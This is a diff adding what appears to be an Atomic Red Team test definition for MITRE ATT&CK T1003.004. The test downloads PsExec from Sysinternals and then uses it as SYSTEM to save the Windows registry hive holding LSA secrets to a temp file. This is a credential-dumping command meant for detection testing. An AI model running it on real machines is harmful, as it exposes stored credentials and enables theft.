@@ -1,0 +1,26 @@
+attack_technique: T1003.004
+display_name: "OS Credential Dumping: LSA Secrets"
+atomic_tests:
+- name: Dumping LSA Secrets
+  description: Dump secrets key from Windows registry
+  supported_platforms:
+  - windows
+  input_arguments:
+    psexec_exe:
+      description: Path to PsExec executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.004\bin\PsExec.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})
+    prereq_command: 'if (Test-Path #{psexec_exe}) {exit 0} else {exit 1}'
+    get_prereq_command: |-
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
+      Expand-Archive $env:TEMP\PSTools.zip $env:TEMP\PSTools -Force
+      New-Item -ItemType Directory (Split-Path #{psexec_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\PSTools\PsExec.exe #{psexec_exe} -Force
+  executor:
+    command: '#{psexec_exe} -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets'
+    cleanup_command: del %temp%\secrets >nul 2> nul
+    name: command_prompt
+    elevation_required: true
